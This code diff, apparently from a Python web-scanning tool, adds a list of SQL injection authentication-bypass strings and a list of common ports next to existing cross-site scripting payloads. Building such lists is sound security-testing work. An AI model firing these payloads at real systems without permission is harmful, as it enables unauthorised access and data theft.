@@ -16,3 +16,13 @@ XSS_PAYLOADS = [
     "%3Cscript%3Ealert(REPLACE)%3C%2Fscript%3E",
     "<body onload=alert(REPLACE)>",
 ]
+
+SQLI_PAYLOADS = [
+    "' OR '1'='1' --",
+    "' OR 1=1 --",
+    "' OR 1=1 -- -",
+    "admin'--",
+    "' OR 'a'='a'--",
+]
+
+COMMON_PORTS = [80, 443, 8080, 22, 23, 3389, 21, 20, 25, 110, 143]
